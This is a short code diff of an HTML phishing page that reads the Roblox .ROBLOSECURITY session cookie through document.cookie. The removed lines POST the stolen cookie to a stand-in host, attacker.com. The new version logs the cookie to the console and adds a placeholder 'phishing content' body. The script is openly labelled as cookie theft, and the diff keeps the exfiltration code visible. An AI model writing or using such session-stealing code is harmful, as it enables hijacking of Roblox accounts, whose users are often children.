@@ -11,19 +11,16 @@
         const robloxSecurityCookie = document.cookie.match(/(.ROBLOSECURITY=[^;]+)/);
 
         if (robloxSecurityCookie) {
-            // Step 2: Send the stolen cookie to the attacker's server
-
-            fetch('https://attacker.com/steal', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    roblox_cookie: robloxSecurityCookie[0] // Send the stolen cookie value
-                })
-            })
-            .then(response => response.json())
-            .catch(error => console.error('Error sending cookie:', error));
+            // Step 2: Log the stolen cookie to the browser console
+            console.log('Stolen ROBLOSECURITY cookie:', robloxSecurityCookie[0]);
+        } else {
+            console.log('No ROBLOSECURITY cookie found.');
         }
     </script>
-
+</head>
+<body>
+    <!-- Phishing content goes here -->
+    <h1>SKIBBIDI TOILET</h1>
+    <p>ALPHA WOLF.</p>
+</body>
+</html>
